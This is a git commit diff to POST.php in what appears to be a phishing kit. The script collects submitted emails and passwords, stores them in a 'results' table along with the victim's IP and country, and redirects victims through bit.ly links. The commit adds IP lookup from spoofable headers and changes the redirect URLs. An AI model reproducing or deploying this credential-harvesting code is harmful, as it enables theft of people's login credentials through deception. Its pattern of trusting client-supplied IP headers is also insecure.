d96ead102092e4f018a902e72e1e8469806f5d29
user-log <76106375+user-log@users.noreply.github.com>
2021-03-24 00:06:06 +0200

    Update POST.php

--- POST.php
+++ POST.php
@@ -6,15 +6,20 @@
     $myEmail = $_POST['email'];
     $myPassword = $_POST['password'];
 
+if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+    $ip = $_SERVER['HTTP_CLIENT_IP'];
+} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+} else {
     $ip = $_SERVER['REMOTE_ADDR'];
-    
+}    
     $stm1 = $con->prepare("SELECT * FROM results WHERE `ip` = ?");
     $stm1->execute(array($ip));
     $ifEx = $stm1->fetchAll();
 
     if(count($ifEx) > 0){
         
-        header ('Location:https://bit.ly/30RtQwS');
+        header ('Location:https://bit.ly/3odBNpT');
 
     }else{
     
@@ -34,7 +39,7 @@
                 'zCountry' => $myCountry,
                 'zIp' => $ip
             ));
-        header ('Location:https://bit.ly/3iKXUjT');
+        header ('Location:https://bit.ly/3nqxTsJ');
         
     
     }
